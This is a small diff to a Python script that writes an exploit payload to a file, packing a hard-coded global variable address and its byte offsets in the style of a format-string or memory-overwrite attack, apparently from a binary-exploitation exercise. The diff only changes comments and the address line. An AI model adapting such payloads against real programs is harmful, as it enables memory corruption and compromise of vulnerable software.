@@ -1,7 +1,6 @@
 import struct
 
-# Assume these values are found through your analysis
-var_address = 0x08049810
+var_address = 0x08049810 #Address of the global var
 
 # Create the payload
 payload = b" "
@@ -18,7 +17,7 @@ payload += struct.pack('I', var_address + 2)
 payload += struct.pack('I', var_address + 3)
 
 
-# Save the payload to a file or pass it directly to the vulnerable program
+# Save the payload to a file
 with open('payload', 'wb') as f:
     f.write(payload)
 
